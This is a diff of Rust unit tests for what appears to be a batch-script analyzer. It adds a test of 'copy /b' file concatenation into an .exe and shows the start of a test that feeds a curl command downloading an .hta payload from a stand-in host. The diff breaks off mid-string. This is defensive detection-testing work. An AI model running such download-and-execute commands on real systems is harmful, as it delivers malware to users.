@@ -22745,6 +22745,37 @@ mod copy_multi_source_tests {
     }
 
     #[test]
+    fn copy_b_adjacent_plus_multi_source_concat_tracked() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "a.bin".to_string(),
+            FsEntry::Content {
+                content: b"AAAA".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "b.bin".to_string(),
+            FsEntry::Content {
+                content: b"BBBB".to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("copy /b a.bin+b.bin out.exe", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("out.exe")
+            .expect("out.exe missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content == b"AAAABBBB"),
+            "adjacent-plus copy did not preserve concatenated content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
     fn copy_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://copy-download.example/payload.hta
